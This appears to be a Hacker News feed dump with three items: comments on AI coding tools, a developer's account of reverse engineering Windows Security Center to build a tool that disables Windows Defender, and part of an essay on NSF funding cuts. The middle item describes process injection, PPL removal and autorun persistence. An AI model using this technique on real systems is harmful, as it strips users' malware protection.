      <center><a id="up_43960297" href="https://news.ycombinator.com/vote?id=43960297&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div>
                  <p>I think with the answer, each responder should include their level of coding proficiency. Or, at least whether they are able to (or even bother to) read the code that the tool generates. Preferences would vary wildly based on it.</p>
              </div></td></tr>
        </tbody></table></td></tr>
            <tr id="43960321"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43960321" href="https://news.ycombinator.com/vote?id=43960321&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>I tested windsurf last week, it installed all dependencies to my global python....it didn't know best practices for Python, and didn't create any virtual env..... I am disappointed. My Cursor experience was slightly better. Still, one issue I had was how to make sure it does not change the part of code I don't want it to change. Every time you ask it to do something for A, it rewrote B in the process, very annoying.</p><p>My best experience so far is v0.dev :)</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43960400"><td></td></tr>
                <tr id="43960805"><td></td></tr>
                  <tr id="43960576"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43960576" href="https://news.ycombinator.com/vote?id=43960576&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>I use Windsurf but it's been having ridiculous downtime lately.</p><p>I can't use Cursor because I don't use Ubuntu which is what their Linux packages are compiled against and they don't run on my non-Ubuntu distro of choice.</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43959880"><td></td></tr>
                <tr id="43959933"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_43959933" href="https://news.ycombinator.com/vote?id=43959933&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div>
                  <p>I love Cline and use it every day. It works the way I think and makes smart decisions about features.</p>
              </div></td></tr>
        </tbody></table></td></tr>
            <tr id="43960013"><td></td></tr>
                  <tr id="43960511"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43960511" href="https://news.ycombinator.com/vote?id=43960511&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div>
                  <p>Claude code is the best so far, I am using the 200$ plan. in terms of feature matrix all tools are almost same with some hits and misses but speed is something which claude code wins.</p>
              </div></td></tr>
        </tbody></table></td></tr>
            <tr id="43961068"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43961068" href="https://news.ycombinator.com/vote?id=43961068&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>I use neovim now, after getting tired of the feature creep and the constant chasing of shiny new features.</p><p>AI is not useful when it does the thinking for you. It's just advanced snippets at that point. I only use LLMs to explain things or to clarify a topic that doesn't make sense right away to me.  That's when it shows it's real strength.</p><p>sing AI for autocomplete? I turn it off.</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43960726"><td></td></tr>
            <tr id="43959912"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43959912" href="https://news.ycombinator.com/vote?id=43959912&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>Currently using cursor. I've found cursor even without the AI features to be a more responsive VS Code. I've found the AI features to be particularly useful when I contain the blast radius to a unit of work.</p><p>If I am continuously able to break down my work into smaller pieces and build a tight testing loop, it does help me be more productive.</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="43960993"><td></td></tr>
                  <tr id="43960006"><td></td></tr>
            <tr id="43959964"><td></td></tr>
            <tr id="43959870"><td></td></tr>
            <tr id="43960141"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43960141" href="https://news.ycombinator.com/vote?id=43960141&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div>
                  <p>I’m using Github Copilot in VScode Insiders, mostly because I don’t want yet another subscription. I guess I’m missing out.</p>
              </div></td></tr>
        </tbody></table></td></tr>
            <tr id="43959885"><td></td></tr>
            <tr id="43959862"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43959862" href="https://news.ycombinator.com/vote?id=43959862&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>Personally copilot/code assist for tab autocomplete, if I need longer boilerplate I request it to the LLM. Usually VIM with LSP.</p><p>Anything that’s not boilerplate I still code it</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43959961"><td></td></tr>
            <tr id="43960249"><td></td></tr>
            <tr id="43959876"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43959876" href="https://news.ycombinator.com/vote?id=43959876&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div>
                  <p>I’d just wait a bit. At current rate of progress winner will be apparent sooner rather than later.</p>
              </div></td></tr>
        </tbody></table></td></tr>
            <tr id="43960029"><td></td></tr>
                <tr id="43960487"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_43960487" href="https://news.ycombinator.com/vote?id=43960487&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>This is the way.</p><p>Getting great results both in chat, edit and now agentic mode. Don’t have to worry about any blocked extensions in the cat and mouse game with MS.</p></div></td></tr>
        </tbody></table></td></tr>
                  <tr id="43960481"><td></td></tr>
            <tr id="43960722"><td></td></tr>
            <tr id="43960113"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43960113" href="https://news.ycombinator.com/vote?id=43960113&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div>
                  <p>Still on codeium lol! Might give aider another spin. It is never been quite good for my needs but tech evolves.</p>
              </div></td></tr>
        </tbody></table></td></tr>
            <tr id="43960545"><td></td></tr>
            <tr id="43959871"><td></td></tr>
            <tr id="43960121"><td></td></tr>
            <tr id="43960201"><td></td></tr>
            <tr id="43960020"><td></td></tr>
                <tr id="43960811"><td></td></tr>
            <tr id="43960522"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_43960522" href="https://news.ycombinator.com/vote?id=43960522&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div>
                  <p>I'd love to try it, could you please share an invite? My email is on my profile page.</p>
              </div></td></tr>
        </tbody></table></td></tr>
            <tr id="43960533"><td></td></tr>
                  <tr id="43960004"><td></td></tr>
            <tr id="43960399"><td></td></tr>
            <tr id="43960337"><td></td></tr>
            <tr id="43960373"><td></td></tr>
            <tr id="43960272"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43960272" href="https://news.ycombinator.com/vote?id=43960272&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>I am using both. Windsurf feels complete less clunky. They are very close tho and the pace of major updates is crazy.</p><p>I dont like CLI based tools to code. Dont understand why they are being shilled. Claude code is maybe better at coding from scratch because it is only raw power and eating tokens like there is no tomorrow but it us the wrong interface to build anything serious.</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43960605"><td></td></tr>
            <tr id="43960476"><td></td></tr>
            </tbody></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[I ruined my vacation by reverse engineering WSC (331 pts)]]></title>
            <link>https://blog.es3n1n.eu/posts/how-i-ruined-my-vacation/</link>
            <guid>43959403</guid>
            <pubDate>Mon, 12 May 2025 03:34:26 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.es3n1n.eu/posts/how-i-ruined-my-vacation/">https://blog.es3n1n.eu/posts/how-i-ruined-my-vacation/</a>, See on <a href="https://news.ycombinator.com/item?id=43959403">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>In this post I will briefly describe the journey I went through while implementing <a href="https://github.com/es3n1n/defendnot">defendnot</a>.</p><p>Even though this is most likely not what you expected to see here, but rather than going into full technical details on how everything works, I will describe what rabbitholes I went through and how painful everything was due to my ✨special✨ environment.</p><p>Beware, most likely this post will be too informal unlike the previous posts of mine, I am pretty sure that all the other posts with <code>irl</code> tag will be written in a style like this. If you are looking for a more detailed technical description of how everything works, a writeup like this will be released a bit later by someone else and I will link it here.</p><h2 id="a-one-year-step-back">A one-year step back</h2><p>Almost exactly one year ago I released a tool <a href="https://github.com/es3n1n/no-defender">no-defender</a>, a project that was disabling windows defender using the special windows api made for antiviruses to let the system know that there is an another antivirus so there is no need to run defender scans.</p><p>The part of the system that manages all this mess is called Windows Security Center - WSC for short. The way how my project worked is that it was using a thirdparty code from some already existing antivirus and forced that av to register the antivirus in WSC.</p><p>Then, after a few weeks after the release, the project blew up quite a bit and gained ~1.5k stars, after that the developers of the antivirus I was using filed a DMCA takedown request and I didn’t really want to do anything with that so just erased everything and called it a day.</p><h2 id="how-it-started">How it started</h2><p>Currently, even while writing this article, I am sitting in an airbnb we rented in Seoul. After numerous trips to other parts of the planet for CTFs and stuff, me and a friend of mine decided that we want to visit Seoul and arrived a few months after that.</p><p>My current main machine for non-ctf things is an M4Pro MacBook, and usually, when I am going for a CTF I bring an another x86 laptop with me to do some extensive reverse engineering/pwn stuff as it is usually built for the x86 cpus. Emulation would kind of work for this task but it is pretty painful so I just use an another laptop for all the x86 stuff.</p><p>And, as you might have guessed, for this trip I did not bring that x86 laptop with me, but I did bring my macbook with me to do some other development stuff in my free-free time. So, I did not have any x86 machine with me to do the x86 reversing.</p><p>And, on May 4th, after a few days spent in South Korea meeting my favorite South Korean CTF friends and drinking alcohol with them, I received a message from MrBruh where they said that they were looking at <a href="https://github.com/es3n1n/no-defender">no-defender</a> and were looking into whether it would be possible to create a “clean” implementation of my project without using any AVs.</p><h2 id="initial-research-day-1">Initial research (Day 1)</h2><p>I am having <em>some</em> troubles with my sleep schedule and I woke up a bit earlier than my friends so I decided to take a look at this while I am waiting for my friends to wake up.</p><p>MrBruh provided me the latest binaries of wsc because I was too lazy to spin up my parallels vm to get the binaries and I started looking into what we got.</p><p>As a reference implementation, I took the WSC registration implementation made by the same AV I was using a year ago. I was somewhat familiar with the internals of their thing and it was a great call.</p><p>Essentially, WSC has a COM API that all antiviruses are using, so I quickly rebuilt everything that AV was doing with it in ~1hr, booted an arm64 windows in parallels and tested the thing. I was greeted with an access denied error.</p><p><img src="https://blog.es3n1n.eu/posts/how-i-ruined-my-vacation/pics/access_denied_error.png" alt="access_denied"></p><p>But from my last year’s courtesy I knew that WSC was somehow validating the process that calls these APIs, my guess was that they are validating the signatures, which was indeed a correct guess but I didn’t know that for sure yet.</p><p>My move then was to inject my code into the same process that is doing all the WSC stuff for that AV and register my AV from there, when I did that this is what come out:</p><p><img src="https://blog.es3n1n.eu/posts/how-i-ruined-my-vacation/pics/first_success.png" alt="first_success"></p><p>Then, I recreated an another COM call to update the status of my fresh-new antivirus I registered and everything worked like a charm as well!</p><p><img src="https://blog.es3n1n.eu/posts/how-i-ruined-my-vacation/pics/twitter_pic.png" alt="twitter_pic"></p><p>As you might have guessed, this is exactly the image I posted on twitter to let my beloved followers know that I might have something cooking:</p><p><img src="https://blog.es3n1n.eu/posts/how-i-ruined-my-vacation/pics/first_tweet.png" alt="tweet"></p><h2 id="trying-to-get-rid-of-the-avs-binary-day-1">Trying to get rid of the AVs binary (Day 1)</h2><p>After my initial research, I spent many hours actually enjoying life and arrived back to airbnb late at night and started tinkering with this again.</p><p>My first idea was to create a legit-signed process, inject my module in it, and execute my shenanigans from there, the exact same thing I was doing except I would use system-provided binaries and not AV’s ones <em>(because I didn’t want my new project to be removed from github by that AV)</em>.</p><p>As a first victim process I chose <code>cmd.exe</code> for no particular reason, just the first thing that came to my mind. However, to my surprise the api rejected my calls and I had to actually dig into the implementation to find out what was causing it.</p><p>After a quick look at <code>wscsvc.dll</code>, I found out that the binary was doing some calls to check the caller process for PPL, but, the binary I was running was created using just simple <code>CreateProcessA</code> call, there is no way it was PPL protected <em>(and it indeed was not)</em>.</p><p><img src="https://blog.es3n1n.eu/posts/how-i-ruined-my-vacation/pics/ppl_guessing.png" alt="ppl_guessing"></p><p>It was already pretty late in the morning so I went to sleep.</p><h2 id="setting-up-environment-day-2">Setting up environment (Day 2)</h2><p>When I woke up, I tried a bunch of other system processes, but nothing really worked, so I decided that it is actually time to properly reverse engineer this service, debug it and find out what is the reason behind all this - something I was really trying to avoid because I did not have an x86 machine.</p><p><img src="https://blog.es3n1n.eu/posts/how-i-ruined-my-vacation/pics/debug_intro.png" alt="debug_intro"></p><p>As you might still remember, I was working on an arm64 macbook and there currently is no sane solutions how to emulate x86 windows on arm macbooks. I didn’t feel like dealing with arm64 stuff and not being able to use my favorite x64dbg, so I asked a good friend of mine to lend me their pc while they are asleep, so that I can debug the wsc service in a virtual machine that will be running on their pc.</p><p>Luckily my friend <a href="https://github.com/pind0s">pindos</a> agreed to this almost instantly, shared an access to their pc through <a href="https://parsec.app/">parsec</a> and went to sleep. A rather notable thing about all this is that while I am in South Korea, they were in the USA so an average latency from my pc to theirs was around 210ms. Not very convenient, but bearable.</p><p>So, at that time, my setup looked like this:</p><ul><li>Build the module in windows arm64 running in parallels using MSVC</li><li>Share the build artifacts with my host using shared folders</li><li>Copy build artifacts using anydesk to the virtual machine running on pindos’ pc</li><li>Debug the service using parsec with 210ms latency</li></ul><p>As you can probably guess, this was <strong>extremely</strong> painful to proceed with, so the speed of development/researching was really poor.</p><h2 id="debugging-wsc-service-day-2">Debugging WSC service (Day 2)</h2><p>Essentially, WSC service is just a dll that is being run by svchost, the only thing that blocks us from attaching debugger to it right ahead is the PPL protection, which very conveniently can be removed with a few lines of code in kernel mode. So I enabled test mode on the vm, spinned up a driver that removed PPL from a process and we were good to go.</p><p>After looking into what happened after <code>cmd.exe</code> requested to register an antivirus in WSC, I traced down that the function it fails in was a so-called <code>WscServiceUtils::CreateExternalBaseFromCaller</code>.</p><p>Here’s a quick preview of that function:</p><div><pre tabindex="0"><code data-lang="cpp"><span><span><span>v10</span> <span>=</span> <span>RpcImpersonateClient</span>(<span>ClientBinding</span>);
</span></span><span><span><span>if</span> ( <span>ConvertStringSidToSidW</span>(<span>L</span><span>"S-1-5-80-1913148863-3492339771-4165695881-2087618961-4109116736"</span>, <span>Sid</span>) )
</span></span><span><span>{
</span></span><span><span>    <span>if</span> ( <span>!</span><span>CheckTokenMembership</span>(<span>0</span>, <span>Sid</span>[<span>0</span>], <span>&amp;</span><span>IsMember</span>) )
</span></span><span><span>    {
</span></span><span><span>        <span>IsMember</span> <span>=</span> <span>0</span>;
</span></span><span><span>    }
</span></span><span><span>    <span>LocalFree</span>(<span>Sid</span>[<span>0</span>]);
</span></span><span><span>}
</span></span><span><span><span>if</span> ( <span>IsMember</span> )
</span></span><span><span>{
</span></span><span><span>    <span>v8</span> <span>=</span> (<span>*</span>(<span>__int64</span> (<span>__fastcall</span> <span>**</span>)(<span>void</span> <span>*</span>, <span>struct</span> <span>CExternalBase</span> <span>**</span>))(<span>*</span>(<span>_QWORD</span> <span>*</span>)<span>a2</span> <span>+</span> <span>8LL</span>))(<span>a2</span>, <span>a4</span>);
</span></span><span><span>}
</span></span><span><span><span>else</span>
</span></span><span><span>{
</span></span><span><span>    <span>// a bunch of some other stuff 
</span></span></span><span><span><span></span>}
</span></span></code></pre></div><p>So what it’s doing is checking whether the process that is calling the RPC methods has a <code>WinDefend</code> SID on a token.</p><p>Back then, I had no idea how any of the token-related stuff worked so I spent some time to get a grasp of how it is exactly working and came to a conclusion right ahead that if we impersonate <code>WinDefend</code>, we will pass all these checks and we should be good.</p><p>It was already evening and I wanted to see what happened in that function for the legit av binary I was initially testing my code in, and <em>for some reason, probably due to sleep deprivation</em> I came to the conclusion that IsMember was equals 1 for that binary. Now looking back on this, I have literally no clue why I assumed that, but I guess such things really tend to happen when you’re trying to speedrun stuff.</p><p><img src="https://blog.es3n1n.eu/posts/how-i-ruined-my-vacation/pics/sid_mystery.png" alt="sid_mystery"></p><h2 id="impersonating-windefend-day-2">Impersonating WinDefend (Day 2)</h2><p>After three more hours of learning how tokens in windows work, I came up with this theory:</p><p><img src="https://blog.es3n1n.eu/posts/how-i-ruined-my-vacation/pics/impersonating_windefend.png" alt="impersonating_windefend"></p><p>I spent some time doing IRL things, then came up with an implementation of the described algo:</p><p><img src="https://blog.es3n1n.eu/posts/how-i-ruined-my-vacation/pics/impersonated_windefend.png" alt="impersonated_windefend"></p><p>Right ahead, after chatting with my friends I wanted to test whether my code will work if I run it within the cmd that has WinDefend sid on its token.</p><p>Surprise surprise, while all the COM calls returned <code>STATUS_SUCCESS</code>, nothing really happened. It didn’t register any new AV, it didn’t do anything.</p><p><img src="https://blog.es3n1n.eu/posts/how-i-ruined-my-vacation/pics/status_success.png" alt="status_success"></p><h2 id="rebuilding-validation-algorithm-day-3">Rebuilding validation algorithm (Day 3)</h2><p>While I was asleep, the owner of PC I was using told me that they are going to sleep, but they didn’t shutdown the pc so I can connect to it anytime. I proceeded doing silly thingies IRL and once I was tired from that, went back to analyzing what was actually happening.</p><p>A first thing I did was verifying whether the checks I thought passed for that binary, indeed passed - mostly because I don’t trust myself, especially when I am sleep deprived. Man, I really tend to overlook things and misinterpret stuff sometimes.</p><p>As it turned out, in fact, the SID check did not pass for the legit AV binary as I thought it did. And it also, turned out, that if you pass that check you will be operating on the WSC object of windows defender, but this is rather useless because you can’t disable it with WSC calls just like that.</p><p>So I removed everything I had for the WinDefend impersonation and started looking into the second branch of the code.</p><p>And what it revealed to me is that if the windefend check didn’t pass, the service will check whether the calling binary is elevated, and then check for the signature and specific dll characteristics flag in the <code>CSecurityVerificationManager::CreateExternalBaseFromPESettings</code>, the function that gets called later on in within this branch:</p><div><pre tabindex="0"><code data-lang="cpp"><span><span><span>/// Check DllCharacteristics flag
</span></span></span><span><span><span></span><span>FileW</span> <span>=</span> <span>CreateFileW</span>(<span>a2</span>, <span>0x80000000</span>, <span>1u</span>, <span>0</span>, <span>3u</span>, <span>0x8000000u</span>, <span>0</span>);
</span></span><span><span><span>FileMappingW</span> <span>=</span> <span>CreateFileMappingW</span>(<span>FileW</span>, <span>0</span>, <span>2u</span>, <span>0</span>, <span>0</span>, <span>0</span>);
</span></span><span><span><span>v12</span> <span>=</span> <span>MapViewOfFile</span>(<span>FileMappingW</span>, <span>4u</span>, <span>0</span>, <span>0</span>, <span>0</span>);
</span></span><span><span><span>v14</span> <span>=</span> <span>ImageNtHeader</span>(<span>v12</span>);
</span></span><span><span><span>v6</span> <span>=</span> <span>SLOBYTE</span>(<span>v14</span><span>-&gt;</span><span>OptionalHeader</span>.<span>DllCharacteristics</span>) <span>&lt;</span> <span>0</span>;
</span></span><span><span><span>UnmapViewOfFile</span>(<span>v13</span>);
</span></span><span><span>
</span></span><span><span><span>/// Check the signature
</span></span></span><span><span><span></span><span>CertContext</span> <span>=</span> <span>GetCertContext</span>(<span>a2</span>, <span>&amp;</span><span>pCertContext</span>);
</span></span><span><span><span>if</span> ( <span>CryptHashPublicKeyInfo</span>(
</span></span><span><span>        <span>0</span>,
</span></span><span><span>        <span>0x8003u</span>,
</span></span><span><span>        <span>0</span>,
</span></span><span><span>        <span>1u</span>,
</span></span><span><span>        <span>&amp;</span><span>pCertContext</span><span>-&gt;</span><span>pCertInfo</span><span>-&gt;</span><span>SubjectPublicKeyInfo</span>,
</span></span><span><span>        (<span>BYTE</span> <span>*</span>)<span>&amp;</span><span>SystemTime</span>,
</span></span><span><span>        <span>&amp;</span><span>pcbComputedHash</span>) )
</span></span><span><span>{
</span></span><span><span>    <span>/// Store signature info
</span></span></span><span><span><span></span>}
</span></span><span><span>
</span></span><span><span><span>/// ...
</span></span></span></code></pre></div><p>After taking a look at the structure of <code>DllCharacteristics</code>, I realized that the flag it checks for is <code>ForceIntegrity</code>.</p><p>In debugger, the failing check I saw is the DllCharacteristics, so to get a new victim process, I recreated the checks wsc is doing on a binary (<code>wsc-binary-check</code> folder in <a href="https://github.com/es3n1n/defendnot">defendnot</a> repo) and tested all the System32 binaries against it.</p><p><img src="https://blog.es3n1n.eu/posts/how-i-ruined-my-vacation/pics/recreated_algo.jpg" alt="recreated_algo"></p><h2 id="using-taskmgr-as-a-victim-process-day-3">Using Taskmgr as a victim process (Day 3)</h2><p>At that time my friend has already woken up and had to do some stuff for the uni on their PC, so I connected directly to the vm using <a href="https://parsec.app/">Parsec</a> and my setup immediately got even worse because on top of the latency issues, now the encoding was being done in software which was super slow.</p><p>I tried to just replace <code>cmd.exe</code> with <code>Taskmgr.exe</code> in my code and unfortunately something was still missing, I was still getting errors from RPC.</p><p>After an attempt to debug this on the same vm, I realized that it was pratically impossible to debug anything because everything was lagging super hard, some keys weren’t pressing, sometimes when I pressed a key once it was pressed two times on the machine - something that is super difficult to put up with.</p><p>So what I did, is I spent $30 on a <a href="https://shadow.tech/">shadow.tech</a> subscription after a friend recommended me this service, as it gives you a bare-metal access to the machine which was something I needed.</p><p>After waiting an hour, my VM was created, I hopped in and noticed that because the windows version they are using is much older than the latest one, the code I was interested in wscsvc wasn’t inlined to a single function and the overall “quality” of decompiled code was much better. Too bad I already had everything figured out, but if you are taking a look at wsc and confused about something due to the fact that everything was inlined in a single function, you can take a look at the older versions.</p><p>To cut the chase, the error that was happening on a VM was due to invalid name I passed as the AV name.</p><p>You see, the way how defendnot transfers data from defendnot-loader to defendnot.dll is by creating a <code>ctx.bin</code> file with serialized parameters. While I added a proper IPC mechanism in the project for state tracking, I was too lazy to port this context thingy to use the same IPC buffer and left the config still using this <code>ctx.bin</code> thing. It was a leftover from the initial <a href="https://github.com/es3n1n/no-defender">no-defender</a> code after all.</p><p>So what happened is that my code was reading an invalid <code>ctx.bin</code> file, because the function that deduced the path of path of this file was broken (it used the base folder of the module of <code>Taskmgr.exe</code>, not of the <code>nodefend.dll</code>), it read a bunch of null bytes and passed that as a name of the AV. Of course wsc rejected this buffer and returned an error.</p><p>After figuring it out, I fixed the issue, tested and here is what happened:</p><p><img src="https://blog.es3n1n.eu/posts/how-i-ruined-my-vacation/pics/worked.png" alt="worked"></p><p><img src="https://blog.es3n1n.eu/posts/how-i-ruined-my-vacation/pics/omg.png" alt="omg"></p><h2 id="cleaning-up-code-day-3">Cleaning up code (Day 3)</h2><p>I wanted to finish everything on this day so I stayed up until 8 am cleaning up code and implementing some other features, such as adding itself to autorun.</p><p>At 8 am, I had everything done except the autorun part because it was just not working. I tested numerous ways how to do it, but nothing really worked so I just went to sleep.</p><h2 id="implementing-autorun-day-4">Implementing autorun (Day 4)</h2><p>When I woke up, I immediately started working on the autorun and realized that while I was creating a task, the reason why my autorun code did not work is because of these two check boxes:</p><p><img src="https://blog.es3n1n.eu/posts/how-i-ruined-my-vacation/pics/task_thing.png" alt="task_thing"></p><p>This is exactly what was happening. My laptop was not on the AC power and the task simply was not executing. After unsetting these two flags, it started working.</p><p>I spent a few more hours cleaning up the code, and that was it.</p><h2 id="conclusion">Conclusion</h2><p>While that was a fun experience, I don’t think I would want to repeat everything I went through these past few days. Considering only that diabolical environment I had, it was already enough to make me lose my mind.</p><p>Thanks for reading, a more technical documentation of wsc will be released a bit later by someone else.</p><h2 id="acknowledgements">Acknowledgements</h2><ul><li><a href="https://github.com/pind0s">Pindos</a> for heating up their room by the pc running at night so that I can debug the WSC service</li><li><a href="https://mrbruh.com/">MrBruh</a> for poking me into researching this and listening to my mad ideas while I was working on this</li><li>Everyone else i was texting during these few days</li><li>I love you kimchi</li><li>The graffiti artist that VANDALIZED our wall</li></ul></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The Academic Pipeline Stall: Why Industry Must Stand for Academia (141 pts)]]></title>
            <link>https://www.sigarch.org/the-academic-pipeline-stall-why-industry-must-stand-for-academia/</link>
            <guid>43959129</guid>
            <pubDate>Mon, 12 May 2025 02:34:32 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.sigarch.org/the-academic-pipeline-stall-why-industry-must-stand-for-academia/">https://www.sigarch.org/the-academic-pipeline-stall-why-industry-must-stand-for-academia/</a>, See on <a href="https://news.ycombinator.com/item?id=43959129">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
					<h2><b>The Research Pipeline is Stalling</b></h2>
<p><span>The </span><a href="https://www.nature.com/articles/d41586-025-01396-2"><span>U.S. National Science Foundation (NSF) froze all outgoing funding</span></a><span>, including new awards and scheduled payments on active grants. Over</span><a href="https://airtable.com/appGKlSVeXniQZkFC/shrFxbl1YTqb3AyOO?jntvk%3Asort=eyJwZWw4ZlRSME8ycmFObWNUYyI6eyJjb2x1bW5JZCI6ImZsZHlMSEpuZkR6OXE1dEw0IiwiYXNjZW5kaW5nIjpmYWxzZX19"><span> 1,000 NSF research projects</span></a><span> were abruptly canceled in a few days, resulting in roughly $739 million in halted research funding. The directive, issued with little explanation, has created chaos across the academic research ecosystem, part of a broader trend <a href="https://www.nature.com/articles/d41586-025-00562-w">Nature</a> described as an unprecedented assault.</span></p>
<p>Before we go any further, let me be clear: this isn’t about sides or ideologies. Support for education and research should be as fundamental as clean air or safe roads. It is part of the shared infrastructure that holds society together. When that foundation cracks, the consequences ripple far beyond the lab.</p>
<p>The ramifications are profound. Laboratories have been forced to suspend operations.<a href="https://www.nature.com/articles/d41586-025-00608-z"> Graduate students face uncertainty</a> about completing their degrees.<a href="https://www.science.org/content/article/u-s-early-career-researchers-struggling-amid-chaos"> Early-career faculty have lost their first major grants</a>, sometimes just months after starting their jobs and labs.<a href="https://www.insidehighered.com/news/government/politics-elections/2025/02/19/federal-funding-uncertainty-prompts-hiring-freezes"> Departments are freezing hiring</a>, deferring PhD admissions, and scrambling to keep core infrastructure afloat. The<a href="https://www.npr.org/2025/05/02/nx-s1-5371720/national-science-foundation-budget-grant-cuts-turmoil"> entire academic research enterprise is stalling</a>, not because the ideas aren’t there, but because the support has vanished. What was once America’s steady innovation engine is now sputtering under the weight of policy and silence.</p>
<p><span>Meanwhile, where are those who benefited from America’s higher education? The tech giants whose founders and engineers were trained in these institutions, whose core technologies were incubated in these research environments? Universities are left to defend </span><a href="https://www.harvard.edu/president/news/2025/the-promise-of-american-higher-education/"><span>The Promise of American Higher Education</span></a><span> alone. There’s no contingency plan for this disruption, no industry emergency fund to save labs, and no guidance on preserving student funding. Every department, PI, and institution is improvising, trying to patch over a pipeline cracking at every joint—a pipeline that sent talent streaming into industry coffers for decades.</span></p>
<p>This is what system designers recognize as a <em>pipeline stall</em>. The inputs (funding and institutional support) are blocked. The outputs (trained students, published research, working prototypes) are starving for resources, creating a growing bubble of dependency hazards. The pipeline stages that move ideas forward (labs, advisors, infrastructure) are frozen, and values cannot be forwarded to the next stage. When the stall isn’t resolved quickly, latency builds, dependencies break, and failure propagates backward through the entire execution path.</p>
<p><span>This blog is a </span><b>call to action</b><span>. It asks our community of researchers, educators, and—especially—our industry leaders and alumni who have directly benefited from higher education to stand in solidarity with the system that built us. It asks the industry (as a holistic entity), in particular, to move beyond silent support and take visible, vocal responsibility for the research pipeline on which it depends. </span></p>
<p><b>The academic pipeline is stalling, and it will take all of us, especially those who have reaped its rewards, to step up as stewards of science and defend the academic foundations that made their success possible.</b></p>
<h2><b>A Legacy We All Recognize</b></h2>
<p><span>We don’t need to remind the SIGARCH community of our shared history. Every member of this community knows that our field’s landmark innovations emerged not purely from product roadmaps but from university labs with federal funding. You know these stories. You lived them, or you studied under those who did.</span></p>
<p><span>The story of systems innovation is inseparable from public research. RISC, out-of-order execution, speculative prefetching, vector processing, GPGPU, and multicore—all of these breakthroughs took shape in university labs, powered by federal support. These weren’t incremental product features. They were conceptual leaps, sometimes radical, requiring time, freedom, and student talent to explore. </span>And these breakthroughs didn’t stay in the lab. They reshaped entire industries. Public investment has powered innovation through three enduring pathways:</p>
<p><strong data-start="674" data-end="730">Academic Tools That Became Global Infrastructure. </strong><a href="http://riscv.org/">RISC-V</a>, now a worldwide open standard, began as a research project at UC Berkeley. The <a href="http://gem5.org/">gem5 simulator</a>, essential for computer architecture research, emerged from NSF-supported efforts at the University of Wisconsin–Madison and Michigan. It continues receiving federal support as it evolves to meet the research community’s needs. <a href="http://llvm.org/">LLVM</a>, the compiler framework now embedded in everything from iOS to data centers, was launched and developed at the University of Illinois with federal funding support.</p>
<p><strong data-start="1082" data-end="1135">Research Projects That Became Industry Giants. </strong><a href="https://www.nsf.gov/news/origins-google">Google began as an NSF-funded</a> Digital Library project at Stanford. <a href="https://www.akamai.com/company/company-history">Akamai spun out of federally funded MIT research on internet traffic</a>, helping to build the content delivery layer of the modern web. <a href="https://www.sbir.gov/success/qualcomm-inducted-sbir-hall-fame">Qualcomm’s early wireless breakthroughs were rooted in federal funding</a>, thanks to faculty at UCSD and UCLA. <a href="https://www.sri.com/75-years-of-innovation/75-years-of-innovation-siri/#:~:text=The%20development%20of%20Siri%20was,Learns%20and%20Observes.">Siri traces its origins to federally funded work</a> in cognitive assistants. Each of these examples shows how public research has seeded technologies that became transformative companies.</p>
